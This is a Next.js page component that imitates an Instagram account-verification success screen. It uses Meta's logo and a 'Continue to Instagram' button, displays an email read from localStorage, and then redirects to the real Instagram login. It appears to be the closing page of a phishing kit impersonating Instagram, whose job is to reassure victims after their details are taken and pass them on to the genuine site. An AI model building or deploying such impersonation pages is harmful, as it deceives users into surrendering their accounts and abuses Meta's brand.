'use client';

import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';

function VerificationSuccessForm() {
  const router = useRouter();
  const [userEmail, setUserEmail] = useState<string>('');

  useEffect(() => {
    // Get the user email from localStorage
    const email = localStorage.getItem('userEmail');
    if (email) {
      setUserEmail(email);
    } else {
      // If no email found, redirect to login
      router.push('/login');
    }
  }, [router]);

  const handleContinue = () => {
    // Redirect to actual Instagram login page
    window.location.href = 'https://www.instagram.com/accounts/login/';
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Language Selector */}
      <div className="text-center pt-6 pb-12">
        <span className="text-gray-500 text-base">English (US)</span>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-6">
        <div className="w-full max-w-sm">
          {/* Success Icon */}
          <div className="text-center mb-8">
            <div className="w-24 h-24 mx-auto mb-6 flex items-center justify-center bg-green-100 rounded-full">
              <svg 
                className="w-12 h-12 text-green-600" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth={2} 
                  d="M5 13l4 4L19 7" 
                />
              </svg>
            </div>
          </div>

          {/* Success Message */}
          <div className="text-center mb-10">
            <h1 className="text-3xl font-semibold text-gray-900 mb-4">
              Account Verified!
            </h1>
            <p className="text-gray-600 text-base mb-2">
              Your account has been successfully verified.
            </p>
            {userEmail && (
              <p className="text-gray-500 text-sm">
                Welcome, {userEmail}
              </p>
            )}
          </div>

          {/* Continue Button */}
          <button
            onClick={handleContinue}
            className="w-full bg-blue-500 text-white py-4 rounded-2xl font-semibold text-base hover:bg-blue-600 transition-colors"
          >
            Continue to Instagram
          </button>

          {/* Additional Info */}
          <div className="text-center mt-8">
            <p className="text-gray-500 text-sm">
              You can now start sharing photos and connecting with friends.
            </p>
          </div>
        </div>
      </div>

      {/* Bottom Section */}
      <div className="pb-12 px-6">
        {/* Meta Logo */}
        <div className="text-center">
          <img 
            src="/images/meta_logo_2.png" 
            alt="Meta" 
            className="h-10 mx-auto opacity-70"
          />
        </div>
      </div>
    </div>
  );
}

export default function VerificationSuccessPage() {
  return <VerificationSuccessForm />;
}
